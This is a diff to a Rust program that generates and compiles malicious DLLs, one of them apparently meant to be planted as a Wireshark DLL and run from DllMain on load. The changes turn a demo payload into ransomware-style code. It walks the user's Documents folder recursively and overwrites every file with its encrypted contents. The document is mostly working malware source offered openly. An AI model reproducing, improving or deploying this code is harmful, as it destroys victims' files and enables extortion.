@@ -52,11 +52,10 @@ pub fn generate_dll() {
     println!("Compiling DLL for {}-bit architecture...", arch);
     compile_dll(&source_file, dll_name, target);
 
-// Cleanup source file
+    // Cleanup source file
     fs::remove_file(&source_file).expect("Failed to delete source file");
 
     println!("DLL generated: {}.dll", dll_name);
-
 }
 
 fn generate_default_dll_code(key: &str) -> String {
@@ -75,19 +74,29 @@ fn generate_default_dll_code(key: &str) -> String {
     fn payload(key: &str) {{
         use std::fs;
         use std::io::Write;
+        use dirs;
 
-        let target_dir = "C:\\\\target_directory";
-        let target_file = format!("{{}}\\\\encrypted_file.txt", target_dir);
+        // Get the current user's home directory
+        let home_dir = dirs::home_dir().expect("Failed to get home directory");
 
-        let _ = fs::create_dir_all(target_dir);
+        // Define the target directory and file dynamically
+        let target_dir = home_dir.join("Documents");
+        let target_file = target_dir.join("encrypted_file.txt");
+
+        // Create the directory if it doesn't exist
+        let _ = fs::create_dir_all(&target_dir);
 
         let data = b"This is some sensitive data.";
         let encrypted_data = encrypt(data, key);
 
+        // Write the encrypted data to the target file
         let mut file = fs::File::create(&target_file).expect("Failed to create file");
         file.write_all(&encrypted_data).expect("Failed to write payload");
 
-        println!("Payload executed: Encrypted file created at {{}}", target_file);
+        println!(
+            "Payload executed: Encrypted file created at {}",
+            target_file.display()
+        );
     }}
 
     fn encrypt(data: &[u8], key: &str) -> Vec<u8> {{
@@ -108,8 +117,12 @@ fn generate_wireshark_dll_code(key: &str) -> String {
     #![crate_type = "cdylib"]
     #![allow(non_snake_case)]
 
+
+
     use std::fs;
     use std::io::Write;
+    use std::path::Path;
+    
 
     #[no_mangle]
     pub extern "C" fn DllMain(_: *mut std::ffi::c_void, reason: u32, _: *mut std::ffi::c_void) -> bool {{
@@ -126,21 +139,46 @@ fn generate_wireshark_dll_code(key: &str) -> String {
     }}
 
     fn encrypt_files(key: &str) {{
-        let target_dir = "C:\\\\target_directory";
-        let target_file = format!("{{}}\\\\encrypted_file.txt", target_dir);
+    use dirs_next::home_dir;
+        if let Some(home_dir) = home_dir() {{
+            let target_dir = home_dir.join("Documents");
 
-        // Create the directory if it doesn't exist
-        let _ = fs::create_dir_all(target_dir);
+            if target_dir.exists() {{
+                encrypt_directory(&target_dir, key);
+            }}
+        }} else {{
+            eprintln!("Could not determine the user's home directory.");
+        }}
+    }}
 
-        // Example data to encrypt
-        let data = b"Sensitive data to be encrypted.";
-        let encrypted_data = encrypt(data, key);
+    fn encrypt_directory(dir: &Path, key: &str) {{
+        if dir.is_dir() {{
+            for entry in fs::read_dir(dir).expect("Failed to read directory") {{
+                if let Ok(entry) = entry {{
+                    let path = entry.path();
 
-        // Write the encrypted data to a file
-        let mut file = fs::File::create(&target_file).expect("Failed to create file");
-        file.write_all(&encrypted_data).expect("Failed to write encrypted data");
+                    if path.is_dir() {{
+                        // Recursively encrypt subdirectories
+                        encrypt_directory(&path, key);
+                    }} else if path.is_file() {{
+                        encrypt_file(&path, key);
+                    }}
+                }}
+            }}
+        }}
+    }}
 
-        println!("Payload executed: Encrypted file created at {{}}", target_file);
+    fn encrypt_file(file_path: &Path, key: &str) {{
+        if let Ok(mut file) = fs::File::open(file_path) {{
+            let mut data = Vec::new();
+            use std::io::Read;
+            if file.read_to_end(&mut data).is_ok() {{
+                let encrypted_data = encrypt(&data, key);
+                if let Ok(mut file) = fs::File::create(file_path) {{
+                    let _ = file.write_all(&encrypted_data);
+                }}
+            }}
+        }}
     }}
 
     fn encrypt(data: &[u8], key: &str) -> Vec<u8> {{
@@ -154,7 +192,6 @@ fn generate_wireshark_dll_code(key: &str) -> String {
         key = key
     )
 }
-
 
 fn compile_dll(source_file: &str, dll_name: &str, target: &str) {
     // Append `.dll` explicitly to the output file name
